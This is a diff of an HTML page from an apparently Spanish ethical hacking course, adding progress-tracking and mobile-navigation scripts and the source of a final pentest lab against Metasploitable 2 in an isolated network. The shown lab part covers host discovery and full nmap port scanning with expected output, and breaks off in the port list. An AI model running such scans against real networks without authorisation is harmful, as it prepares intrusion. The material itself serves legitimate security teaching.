@@ -79,7 +79,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 <link href="../site_libs/quarto-html/quarto-syntax-highlighting-dark-68056a18e515a5789c5e26a7aeb7ac61.css" rel="stylesheet" id="quarto-text-highlighting-styles">
 <script src="../site_libs/bootstrap/bootstrap.min.js"></script>
 <link href="../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
-<link href="../site_libs/bootstrap/bootstrap-e7a9eae8d420f84057ababff31fce67b.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="dark">
+<link href="../site_libs/bootstrap/bootstrap-9265db7866925a9d8c3a929a182b61d8.min.css" rel="stylesheet" append-hash="true" id="quarto-bootstrap" data-mode="dark">
 <script id="quarto-search-options" type="application/json">{
   "location": "sidebar",
   "copy-button": false,
@@ -163,7 +163,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
           <li class="sidebar-item">
   <div class="sidebar-item-container"> 
   <a href="../contenido/unidad1.html" class="sidebar-item-text sidebar-link">
- <span class="menu-text"><span class="chapter-number">2</span>&nbsp; <span class="chapter-title">🛡️ Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span></a>
+ <span class="menu-text"><span class="chapter-number">2</span>&nbsp; <span class="chapter-title">Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span></a>
   </div>
 </li>
           <li class="sidebar-item">
@@ -432,7 +432,7 @@ pre > code.sourceCode > span > a:first-child::before { text-decoration: underlin
 
 <header id="title-block-header" class="quarto-title-block default"><nav class="quarto-page-breadcrumbs quarto-title-breadcrumbs d-none d-lg-block" aria-label="breadcrumb"><ol class="breadcrumb"><li class="breadcrumb-item"><a href="../labs/lab-unidad1.html">Laboratorios</a></li><li class="breadcrumb-item"><a href="../labs/lab-unidad8.html"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></a></li></ol></nav>
 <div class="quarto-title">
-<h1 class="title"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></h1>
+<div class="quarto-title-block"><div><h1 class="title"><span class="chapter-number">17</span>&nbsp; <span class="chapter-title">Lab 8 — Proyecto Final: Pentest End-to-End</span></h1><button type="button" class="btn code-tools-button" id="quarto-code-tools-source"><i class="bi"></i> Code</button></div></div>
 </div>
 
 
@@ -1446,10 +1446,485 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
 </ul>
 
 
+<!-- -->
+
 </section>
 </section>
 
 </main> <!-- /main -->
+/**
+ * Sistema de Progreso para Ethical Hacking 2026
+ * Almacena el progreso del usuario en localStorage
+ */
+
+(function() {
+    'use strict';
+
+    // Clave para localStorage
+    const STORAGE_KEY = 'ethical_hacking_2026_progress';
+
+    // Estructura de datos del progreso
+    const defaultProgress = {
+        completedUnits: [],
+        completedLabs: [],
+        completedQuizzes: [],
+        lastVisited: null,
+        startDate: new Date().toISOString(),
+        totalVisitTime: 0
+    };
+
+    // Inicializar progreso
+    function initProgress() {
+        let progress = localStorage.getItem(STORAGE_KEY);
+        if (!progress) {
+            progress = defaultProgress;
+            saveProgress(progress);
+        } else {
+            progress = JSON.parse(progress);
+        }
+        return progress;
+    }
+
+    // Guardar progreso
+    function saveProgress(progress) {
+        localStorage.setItem(STORAGE_KEY, JSON.stringify(progress));
+    }
+
+    // Marcar unidad como completada
+    function markUnitCompleted(unitId) {
+        const progress = initProgress();
+        if (!progress.completedUnits.includes(unitId)) {
+            progress.completedUnits.push(unitId);
+            progress.lastVisited = unitId;
+            saveProgress(progress);
+            updateUI();
+            console.log(`Unidad ${unitId} marcada como completada`);
+        }
+    }
+
+    // Marcar lab como completado
+    function markLabCompleted(labId) {
+        const progress = initProgress();
+        if (!progress.completedLabs.includes(labId)) {
+            progress.completedLabs.push(labId);
+            saveProgress(progress);
+            updateUI();
+            console.log(`Lab ${labId} marcado como completado`);
+        }
+    }
+
+    // Marcar quiz como completado
+    function markQuizCompleted(quizId) {
+        const progress = initProgress();
+        if (!progress.completedQuizzes.includes(quizId)) {
+            progress.completedQuizzes.push(quizId);
+            saveProgress(progress);
+            updateUI();
+            console.log(`Quiz ${quizId} marcado como completado`);
+        }
+    }
+
+    // Obtener progreso actual
+    function getProgress() {
+        return initProgress();
+    }
+
+    // Calcular porcentaje de progreso
+    function calculateProgress() {
+        const progress = getProgress();
+        const totalItems = 8 + 8 + 8; // 8 unidades + 8 labs + 8 quizzes
+        const completedItems = progress.completedUnits.length +
+                              progress.completedLabs.length +
+                              progress.completedQuizzes.length;
+        return Math.round((completedItems / totalItems) * 100);
+    }
+
+    // Actualizar UI del progreso
+    function updateUI() {
+        const progress = getProgress();
+        const percentage = calculateProgress();
+
+        // Actualizar barra de progreso si existe
+        const progressBar = document.querySelector('.progress-bar');
+        if (progressBar) {
+            progressBar.style.width = percentage + '%';
+        }
+
+        // Actualizar estadísticas si existen
+        const statsContainer = document.querySelector('.progress-stats');
+        if (statsContainer) {
+            statsContainer.innerHTML = `
+                <div class="stat-item">
+                    <div class="stat-value">${progress.completedUnits.length}/8</div>
+                    <div class="stat-label">Unidades</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${progress.completedLabs.length}/8</div>
+                    <div class="stat-label">Labs</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${progress.completedQuizzes.length}/8</div>
+                    <div class="stat-label">Quizzes</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value">${percentage}%</div>
+                    <div class="stat-label">Completado</div>
+                </div>
+            `;
+        }
+
+        // Actualizar indicadores de completado en la lista de unidades
+        document.querySelectorAll('[data-unit-id]').forEach(element =&gt; {
+            const unitId = element.getAttribute('data-unit-id');
+            if (progress.completedUnits.includes(unitId)) {
+                element.classList.add('completed');
+                if (!element.querySelector('.completed-badge')) {
+                    const badge = document.createElement('span');
+                    badge.className = 'completed-badge';
+                    badge.textContent = '✓';
+                    element.appendChild(badge);
+                }
+            }
+        });
+    }
+
+    // Función para agregar botón de completar a cada sección
+    function addCompleteButtons() {
+        // Buscar contenedores de contenido
+        const contentContainers = document.querySelectorAll('.content, main, article');
+
+        contentContainers.forEach(container =&gt; {
+            // Crear botón de completar
+            const completeBtn = document.createElement('button');
+            completeBtn.className = 'btn-complete';
+            completeBtn.textContent = 'Marcar como completado';
+            completeBtn.style.cssText = `
+                position: fixed;
+                bottom: 20px;
+                right: 20px;
+                background: #27ae60;
+                color: white;
+                border: none;
+                padding: 10px 20px;
+                border-radius: 5px;
+                cursor: pointer;
+                z-index: 1000;
+                box-shadow: 0 2px 10px rgba(0,0,0,0.3);
+            `;
+
+            // Determinar qué tipo de contenido es
+            const currentPath = window.location.pathname;
+            let contentType = '';
+            let contentId = '';
+
+            if (currentPath.includes('/contenido/unidad')) {
+                contentType = 'unit';
+                contentId = currentPath.match(/unidad(\d+)/)[1];
+            } else if (currentPath.includes('/labs/lab-unidad')) {
+                contentType = 'lab';
+                contentId = currentPath.match(/lab-unidad(\d+)/)[1];
+            } else if (currentPath.includes('/quizzes/unidad')) {
+                contentType = 'quiz';
+                contentId = currentPath.match(/unidad(\d+)/)[1];
+            }
+
+            // Agregar evento al botón
+            completeBtn.addEventListener('click', function() {
+                if (contentType === 'unit') {
+                    markUnitCompleted('unidad' + contentId);
+                    this.textContent = '✓ Completado';
+                    this.style.background = '#27ae60';
+                } else if (contentType === 'lab') {
+                    markLabCompleted('lab-unidad' + contentId);
+                    this.textContent = '✓ Completado';
+                    this.style.background = '#27ae60';
+                } else if (contentType === 'quiz') {
+                    markQuizCompleted('unidad' + contentId);
+                    this.textContent = '✓ Completado';
+                    this.style.background = '#27ae60';
+                }
+            });
+
+            // Solo agregar si no existe ya
+            if (!document.querySelector('.btn-complete')) {
+                document.body.appendChild(completeBtn);
+            }
+        });
+    }
+
+    // Función para crear panel de progreso
+    function createProgressPanel() {
+        const sidebar = document.querySelector('.sidebar');
+        if (!sidebar) return;
+
+        // Crear panel de progreso
+        const progressPanel = document.createElement('div');
+        progressPanel.className = 'course-progress';
+        progressPanel.innerHTML = `
+            <h3>📈 Tu Progreso</h3>
+            <div class="progress-stats">
+                <div class="stat-item">
+                    <div class="stat-value" id="units-progress">0/8</div>
+                    <div class="stat-label">Unidades</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="labs-progress">0/8</div>
+                    <div class="stat-label">Labs</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="quizzes-progress">0/8</div>
+                    <div class="stat-label">Quizzes</div>
+                </div>
+                <div class="stat-item">
+                    <div class="stat-value" id="total-progress">0%</div>
+                    <div class="stat-label">Completado</div>
+                </div>
+            </div>
+        `;
+
+        // Insertar al inicio de la sidebar
+        sidebar.insertBefore(progressPanel, sidebar.firstChild);
+    }
+
+    // Inicializar cuando el DOM esté listo
+    document.addEventListener('DOMContentLoaded', function() {
+        initProgress();
+        updateUI();
+        addCompleteButtons();
+        createProgressPanel();
+
+        // Actualizar cada vez que cambie la URL (SPA)
+        window.addEventListener('popstate', function() {
+            setTimeout(updateUI, 100);
+        });
+    });
+
+    // Exponer funciones globalmente para uso en otros scripts
+    window.CourseProgress = {
+        markUnitCompleted,
+        markLabCompleted,
+        markQuizCompleted,
+        getProgress,
+        calculateProgress
+    };
+
+    console.log('Sistema de progreso inicializado');
+})();
+/**
+ * Navegación Móvil para Ethical Hacking 2026
+ * Mejora la experiencia en dispositivos móviles
+ */
+
+(function() {
+    'use strict';
+
+    // Configuración
+    const MOBILE_BREAKPOINT = 768;
+    let isMobile = window.innerWidth &lt;= MOBILE_BREAKPOINT;
+
+    // Inicializar navegación móvil
+    function initMobileNav() {
+        // Crear botón de menú hamburguesa
+        const menuBtn = document.createElement('button');
+        menuBtn.className = 'mobile-menu-btn';
+        menuBtn.innerHTML = `
+            <span></span>
+            <span></span>
+            <span></span>
+        `;
+        menuBtn.setAttribute('aria-label', 'Abrir menú de navegación');
+        menuBtn.setAttribute('aria-expanded', 'false');
+
+        // Estilos del botón
+        menuBtn.style.cssText = `
+            display: none;
+            flex-direction: column;
+            justify-content: space-around;
+            width: 30px;
+            height: 25px;
+            background: transparent;
+            border: none;
+            cursor: pointer;
+            padding: 0;
+            z-index: 1002;
+            position: fixed;
+            top: 15px;
+            left: 15px;
+        `;
+
+        // Líneas del botón hamburguesa
+        menuBtn.querySelectorAll('span').forEach(span =&gt; {
+            span.style.cssText = `
+                display: block;
+                height: 3px;
+                width: 100%;
+                background-color: #ecf0f1;
+                border-radius: 2px;
+                transition: all 0.3s ease;
+            `;
+        });
+
+        // Crear overlay
+        const overlay = document.createElement('div');
+        overlay.className = 'sidebar-overlay';
+        overlay.style.cssText = `
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 999;
+        `;
+
+        // Agregar al DOM
+        document.body.appendChild(menuBtn);
+        document.body.appendChild(overlay);
+
+        // Obtener sidebar
+        const sidebar = document.querySelector('.sidebar');
+
+        // Función para abrir/cerrar menú
+        function toggleMenu() {
+            const isOpen = sidebar.classList.contains('open');
+
+            if (isOpen) {
+                sidebar.classList.remove('open');
+                overlay.classList.remove('active');
+                menuBtn.setAttribute('aria-expanded', 'false');
+                document.body.style.overflow = '';
+            } else {
+                sidebar.classList.add('open');
+                overlay.classList.add('active');
+                menuBtn.setAttribute('aria-expanded', 'true');
+                document.body.style.overflow = 'hidden';
+            }
+        }
+
+        // Event listeners
+        menuBtn.addEventListener('click', toggleMenu);
+        overlay.addEventListener('click', toggleMenu);
+
+        // Cerrar con tecla Escape
+        document.addEventListener('keydown', function(e) {
+            if (e.key === 'Escape' &amp;&amp; sidebar.classList.contains('open')) {
+                toggleMenu();
+            }
+        });
+
+        // Mostrar/ocultar botón según tamaño de pantalla
+        function updateMenuButton() {
+            isMobile = window.innerWidth &lt;= MOBILE_BREAKPOINT;
+            menuBtn.style.display = isMobile ? 'flex' : 'none';
+
+            if (!isMobile) {
+                sidebar.classList.remove('open');
+                overlay.classList.remove('active');
+                document.body.style.overflow = '';
+            }
+        }
+
+        window.addEventListener('resize', updateMenuButton);
+        updateMenuButton();
+
+        // Agregar swipe gestures para móvil
+        let touchStartX = 0;
+        let touchEndX = 0;
+
+        document.addEventListener('touchstart', function(e) {
+            touchStartX = e.changedTouches[0].screenX;
+        });
+
+        document.addEventListener('touchend', function(e) {
+            touchEndX = e.changedTouches[0].screenX;
+            handleSwipe();
+        });
+
+        function handleSwipe() {
+            const swipeThreshold = 50;
+            const diff = touchStartX - touchEndX;
+
+            // Swipe izquierdo (cerrar menú)
+            if (diff &gt; swipeThreshold &amp;&amp; sidebar.classList.contains('open')) {
+                toggleMenu();
+            }
+
+            // Swipe derecho (abrir menú)
+            if (diff &lt; -swipeThreshold &amp;&amp; !sidebar.classList.contains('open') &amp;&amp; touchStartX &lt; 50) {
+                toggleMenu();
+            }
+        }
+
+        console.log('Navegación móvil inicializada');
+    }
+
+    // Función para mejorar scroll en móvil
+    function improveMobileScroll() {
+        // Agregar indicador de scroll horizontal para tablas
+        const tables = document.querySelectorAll('table');
+        tables.forEach(table =&gt; {
+            const wrapper = document.createElement('div');
+            wrapper.style.overflowX = 'auto';
+            wrapper.style.webkitOverflowScrolling = 'touch';
+            table.parentNode.insertBefore(wrapper, table);
+            wrapper.appendChild(table);
+        });
+
+        // Suavizar scroll en móvil
+        if ('ontouchstart' in window) {
+            document.documentElement.style.scrollBehavior = 'smooth';
+        }
+    }
+
+    // Función para optimizar tap targets en móvil
+    function optimizeTapTargets() {
+        // Aumentar tamaño de enlaces y botones en móvil
+        const style = document.createElement('style');
+        style.textContent = `
+            @media (max-width: 768px) {
+                a, button {
+                    min-height: 44px;
+                    min-width: 44px;
+                }
+
+                .sidebar a {
+                    padding: 15px 20px;
+                    display: block;
+                }
+
+                .btn-complete {
+                    bottom: 10px !important;
+                    right: 10px !important;
+                    padding: 12px 24px !important;
+                }
+            }
+        `;
+        document.head.appendChild(style);
+    }
+
+    // Inicializar cuando el DOM esté listo
+    document.addEventListener('DOMContentLoaded', function() {
+        initMobileNav();
+        improveMobileScroll();
+        optimizeTapTargets();
+    });
+
+    // Exponer funciones globalmente
+    window.MobileNav = {
+        init: initMobileNav,
+        toggle: function() {
+            const sidebar = document.querySelector('.sidebar');
+            const overlay = document.querySelector('.sidebar-overlay');
+            if (sidebar &amp;&amp; overlay) {
+                sidebar.classList.toggle('open');
+                overlay.classList.toggle('active');
+            }
+        }
+    };
+
+    console.log('Mejoras móviles inicializadas');
+})();
 <script id="quarto-html-after-body" type="application/javascript">
   window.document.addEventListener("DOMContentLoaded", function (event) {
     const icon = "";
@@ -1520,6 +1995,57 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
         container: window.document.getElementById('quarto-embedded-source-code-modal')
       });
       clipboardModal.on('success', onCopySuccess);
+    }
+    const viewSource = window.document.getElementById('quarto-view-source') ||
+                       window.document.getElementById('quarto-code-tools-source');
+    if (viewSource) {
+      const sourceUrl = viewSource.getAttribute("data-quarto-source-url");
+      viewSource.addEventListener("click", function(e) {
+        if (sourceUrl) {
+          // rstudio viewer pane
+          if (/\bcapabilities=\b/.test(window.location)) {
+            window.open(sourceUrl);
+          } else {
+            window.location.href = sourceUrl;
+          }
+        } else {
+          const modal = new bootstrap.Modal(document.getElementById('quarto-embedded-source-code-modal'));
+          modal.show();
+        }
+        return false;
+      });
+    }
+    function toggleCodeHandler(show) {
+      return function(e) {
+        const detailsSrc = window.document.querySelectorAll(".cell > details > .sourceCode");
+        for (let i=0; i<detailsSrc.length; i++) {
+          const details = detailsSrc[i].parentElement;
+          if (show) {
+            details.open = true;
+          } else {
+            details.removeAttribute("open");
+          }
+        }
+        const cellCodeDivs = window.document.querySelectorAll(".cell > .sourceCode");
+        const fromCls = show ? "hidden" : "unhidden";
+        const toCls = show ? "unhidden" : "hidden";
+        for (let i=0; i<cellCodeDivs.length; i++) {
+          const codeDiv = cellCodeDivs[i];
+          if (codeDiv.classList.contains(fromCls)) {
+            codeDiv.classList.remove(fromCls);
+            codeDiv.classList.add(toCls);
+          } 
+        }
+        return false;
+      }
+    }
+    const hideAllCode = window.document.getElementById("quarto-hide-all-code");
+    if (hideAllCode) {
+      hideAllCode.addEventListener("click", toggleCodeHandler(false));
+    }
+    const showAllCode = window.document.getElementById("quarto-show-all-code");
+    if (showAllCode) {
+      showAllCode.addEventListener("click", toggleCodeHandler(true));
     }
       var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
       var mailtoRegex = new RegExp(/^mailto:/);
@@ -1861,7 +2387,1005 @@ incluyendo datos de aplicaciones DVWA, tikiwiki y metasploit.
         <span class="nav-page-text"><span class="chapter-number">18</span>&nbsp; <span class="chapter-title">Quiz Unidad 1: Fundamentos y Reconocimiento Agéntico</span></span> <i class="bi bi-arrow-right-short"></i>
       </a>
   </div>
-</nav>
+</nav><div class="modal fade" id="quarto-embedded-source-code-modal" tabindex="-1" aria-labelledby="quarto-embedded-source-code-modal-label" aria-hidden="true"><div class="modal-dialog modal-dialog-scrollable"><div class="modal-content"><div class="modal-header"><h5 class="modal-title" id="quarto-embedded-source-code-modal-label">Source Code</h5><button class="btn-close" data-bs-dismiss="modal"></button></div><div class="modal-body"><div class="">
+<div class="code-copy-outer-scaffold"><div class="sourceCode" id="cb43" data-shortcodes="false"><pre class="sourceCode markdown code-with-copy"><code class="sourceCode markdown"><span id="cb43-1"><a href="#cb43-1" aria-hidden="true" tabindex="-1"></a><span class="fu"># Lab 8 — Proyecto Final: Pentest End-to-End</span></span>
+<span id="cb43-2"><a href="#cb43-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-3"><a href="#cb43-3" aria-hidden="true" tabindex="-1"></a><span class="fu">## Objetivo</span></span>
+<span id="cb43-4"><a href="#cb43-4" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-5"><a href="#cb43-5" aria-hidden="true" tabindex="-1"></a>Ejecutar un pentest profesional completo contra Metasploitable 2, aplicando todas las técnicas aprendidas durante el curso. El estudiante pasará por cada fase del ciclo de vida de un pentest real: reconocimiento, escaneo y enumeración, explotación de múltiples vectores, post-explotación, y entrega de un reporte profesional con hallazgos, evidencias y recomendaciones de remediación.</span>
+<span id="cb43-6"><a href="#cb43-6" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-7"><a href="#cb43-7" aria-hidden="true" tabindex="-1"></a>Al finalizar, el estudiante habrá demostrado capacidad para:</span>
+<span id="cb43-8"><a href="#cb43-8" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Identificar servicios vulnerables en una red interna</span>
+<span id="cb43-9"><a href="#cb43-9" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Explotar al menos tres vectores de ataque diferentes</span>
+<span id="cb43-10"><a href="#cb43-10" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Escalar privilegios y mantener persistencia</span>
+<span id="cb43-11"><a href="#cb43-11" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Documentar hallazgos con CVEs, scores CVSS y pasos de reproducción</span>
+<span id="cb43-12"><a href="#cb43-12" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Redactar un reporte ejecutivo y técnico orientado al cliente</span>
+<span id="cb43-13"><a href="#cb43-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-14"><a href="#cb43-14" aria-hidden="true" tabindex="-1"></a><span class="fu">## Prerrequisitos</span></span>
+<span id="cb43-15"><a href="#cb43-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-16"><a href="#cb43-16" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Haber completado Labs 1–7</span>
+<span id="cb43-17"><a href="#cb43-17" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Kali Linux 2024.x (VirtualBox o VMware) — mínimo 4 GB RAM, 40 GB disco</span>
+<span id="cb43-18"><a href="#cb43-18" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Metasploitable 2 descargado e importado como VM separada</span>
+<span id="cb43-19"><a href="#cb43-19" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>Conocimiento básico de Metasploit Framework, nmap y enumeración de servicios</span>
+<span id="cb43-20"><a href="#cb43-20" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-21"><a href="#cb43-21" aria-hidden="true" tabindex="-1"></a><span class="fu">## Entorno</span></span>
+<span id="cb43-22"><a href="#cb43-22" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-23"><a href="#cb43-23" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Máquina     <span class="pp">|</span> SO                   <span class="pp">|</span> IP                                         <span class="pp">|</span> Rol      <span class="pp">|</span></span>
+<span id="cb43-24"><a href="#cb43-24" aria-hidden="true" tabindex="-1"></a><span class="pp">|-------------|----------------------|--------------------------------------------|----------|</span></span>
+<span id="cb43-25"><a href="#cb43-25" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Atacante    <span class="pp">|</span> Kali Linux 2024.x    <span class="pp">|</span> 192.168.56.101                             <span class="pp">|</span> Pentest  <span class="pp">|</span></span>
+<span id="cb43-26"><a href="#cb43-26" aria-hidden="true" tabindex="-1"></a><span class="pp">|</span> Objetivo    <span class="pp">|</span> Metasploitable 2     <span class="pp">|</span> 192.168.56.102 *(ajustar según entorno)*   <span class="pp">|</span> Víctima  <span class="pp">|</span></span>
+<span id="cb43-27"><a href="#cb43-27" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-28"><a href="#cb43-28" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Red**: Host-Only (<span class="in">`vboxnet0`</span>) o NAT interno — el objetivo NO debe tener salida a Internet</span>
+<span id="cb43-29"><a href="#cb43-29" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Tiempo estimado**: 4–6 horas</span>
+<span id="cb43-30"><a href="#cb43-30" aria-hidden="true" tabindex="-1"></a><span class="ss">- </span>**Herramientas**: nmap, metasploit, enum4linux, nikto, dirb, smbclient, netdiscover, hydra, john — todas incluidas en Kali</span>
+<span id="cb43-31"><a href="#cb43-31" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-32"><a href="#cb43-32" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-33"><a href="#cb43-33" aria-hidden="true" tabindex="-1"></a><span class="co"># Verificar conectividad antes de comenzar</span></span>
+<span id="cb43-34"><a href="#cb43-34" aria-hidden="true" tabindex="-1"></a><span class="fu">ping</span> <span class="at">-c</span> 3 192.168.56.102</span>
+<span id="cb43-35"><a href="#cb43-35" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-36"><a href="#cb43-36" aria-hidden="true" tabindex="-1"></a><span class="co"># Guardar la IP como variable de entorno</span></span>
+<span id="cb43-37"><a href="#cb43-37" aria-hidden="true" tabindex="-1"></a><span class="bu">export</span> <span class="va">TARGET</span><span class="op">=</span>192.168.56.102</span>
+<span id="cb43-38"><a href="#cb43-38" aria-hidden="true" tabindex="-1"></a><span class="bu">echo</span> <span class="st">"Objetivo: </span><span class="va">$TARGET</span><span class="st">"</span></span>
+<span id="cb43-39"><a href="#cb43-39" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-40"><a href="#cb43-40" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-41"><a href="#cb43-41" aria-hidden="true" tabindex="-1"></a>---</span>
+<span id="cb43-42"><a href="#cb43-42" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-43"><a href="#cb43-43" aria-hidden="true" tabindex="-1"></a><span class="fu">## Fase 1: Reconocimiento</span></span>
+<span id="cb43-44"><a href="#cb43-44" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-45"><a href="#cb43-45" aria-hidden="true" tabindex="-1"></a>**Objetivo**: Identificar el objetivo en la red, sistemas operativos y primera impresión de la superficie de ataque.</span>
+<span id="cb43-46"><a href="#cb43-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-47"><a href="#cb43-47" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.1 Descubrimiento de Host</span></span>
+<span id="cb43-48"><a href="#cb43-48" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-49"><a href="#cb43-49" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-50"><a href="#cb43-50" aria-hidden="true" tabindex="-1"></a><span class="co"># Descubrir hosts activos en la subred</span></span>
+<span id="cb43-51"><a href="#cb43-51" aria-hidden="true" tabindex="-1"></a><span class="ex">netdiscover</span> <span class="at">-r</span> 192.168.56.0/24 <span class="at">-i</span> eth0</span>
+<span id="cb43-52"><a href="#cb43-52" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-53"><a href="#cb43-53" aria-hidden="true" tabindex="-1"></a><span class="co"># Alternativa con nmap (más rápido)</span></span>
+<span id="cb43-54"><a href="#cb43-54" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sn</span> 192.168.56.0/24 <span class="at">-oG</span> hosts_activos.txt</span>
+<span id="cb43-55"><a href="#cb43-55" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="st">"Up"</span> hosts_activos.txt</span>
+<span id="cb43-56"><a href="#cb43-56" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-57"><a href="#cb43-57" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-58"><a href="#cb43-58" aria-hidden="true" tabindex="-1"></a>**Output esperado**:</span>
+<span id="cb43-59"><a href="#cb43-59" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-60"><a href="#cb43-60" aria-hidden="true" tabindex="-1"></a><span class="in">Starting Nmap 7.94 ( https://nmap.org )</span></span>
+<span id="cb43-61"><a href="#cb43-61" aria-hidden="true" tabindex="-1"></a><span class="in">Nmap scan report for 192.168.56.102</span></span>
+<span id="cb43-62"><a href="#cb43-62" aria-hidden="true" tabindex="-1"></a><span class="in">Host is up (0.00041s latency).</span></span>
+<span id="cb43-63"><a href="#cb43-63" aria-hidden="true" tabindex="-1"></a><span class="in">MAC Address: 08:00:27:XX:XX:XX (Oracle VirtualBox)</span></span>
+<span id="cb43-64"><a href="#cb43-64" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-65"><a href="#cb43-65" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-66"><a href="#cb43-66" aria-hidden="true" tabindex="-1"></a><span class="fu">### 1.2 Escaneo de Puertos — Primera Pasada</span></span>
+<span id="cb43-67"><a href="#cb43-67" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-68"><a href="#cb43-68" aria-hidden="true" tabindex="-1"></a><span class="in">```bash</span></span>
+<span id="cb43-69"><a href="#cb43-69" aria-hidden="true" tabindex="-1"></a><span class="co"># Escaneo rápido TCP SYN para descubrir puertos abiertos</span></span>
+<span id="cb43-70"><a href="#cb43-70" aria-hidden="true" tabindex="-1"></a><span class="fu">nmap</span> <span class="at">-sS</span> <span class="at">-T4</span> <span class="at">-p-</span> <span class="va">$TARGET</span> <span class="at">-oN</span> fase1_puertos.txt</span>
+<span id="cb43-71"><a href="#cb43-71" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-72"><a href="#cb43-72" aria-hidden="true" tabindex="-1"></a><span class="co"># Ver resumen de puertos abiertos</span></span>
+<span id="cb43-73"><a href="#cb43-73" aria-hidden="true" tabindex="-1"></a><span class="fu">grep</span> <span class="st">"^[0-9]"</span> fase1_puertos.txt</span>
+<span id="cb43-74"><a href="#cb43-74" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-75"><a href="#cb43-75" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb43-76"><a href="#cb43-76" aria-hidden="true" tabindex="-1"></a>**Output esperado (extracto)**:</span>
+<span id="cb43-77"><a href="#cb43-77" aria-hidden="true" tabindex="-1"></a><span class="in">```</span></span>
+<span id="cb43-78"><a href="#cb43-78" aria-hidden="true" tabindex="-1"></a><span class="in">21/tcp    open   ftp</span></span>
+<span id="cb43-79"><a href="#cb43-79" aria-hidden="true" tabindex="-1"></a><span class="in">22/tcp    open   ssh</span></span>
+<span id="cb43-80"><a href="#cb43-80" aria-hidden="true" tabindex="-1"></a><span class="in">23/tcp    open   telnet</span></span>
+<span id="cb43-81"><a href="#cb43-81" aria-hidden="true" tabindex="-1"></a><span class="in">25/tcp    open   smtp</span></span>
+<span id="cb43-82"><a href="#cb43-82" aria-hidden="true" tabindex="-1"></a><span class="in">53/tcp    open   domain</span></span>
+<span id="cb43-83"><a href="#cb43-83" aria-hidden="true" tabindex="-1"></a><span class="in">80/tcp    open   http</span></span>
+<span id="cb43-84"><a href="#cb43-84" aria-hidden="true" tabindex="-1"></a><span class="in">111/tcp   open   rpcbind</span></span>
+<span id="cb43-85"><a href="#cb43-85" aria-hidden="true" tabindex="-1"></a><span class="in">139/tcp   open   netbios-ssn</span></span>
+<span id="cb43-86"><a href="#cb43-86" aria-hidden="true" tabindex="-1"></a><span class="in">445/tcp   open   microsoft-ds</span></span>
+<span id="cb43-87"><a href="#cb43-87" aria-hidden="true" tabindex="-1"></a><span class="in">512/tcp   open   exec</span></span>
+<span id="cb43-88"><a href="#cb43-88" aria-hidden="true" tabindex="-1"></a><span class="in">513/tcp   open   login</span></span>
+<span id="cb43-89"><a href="#cb43-89" aria-hidden="true" tabindex="-1"></a><span class="in">514/tcp   open   shell</span></span>
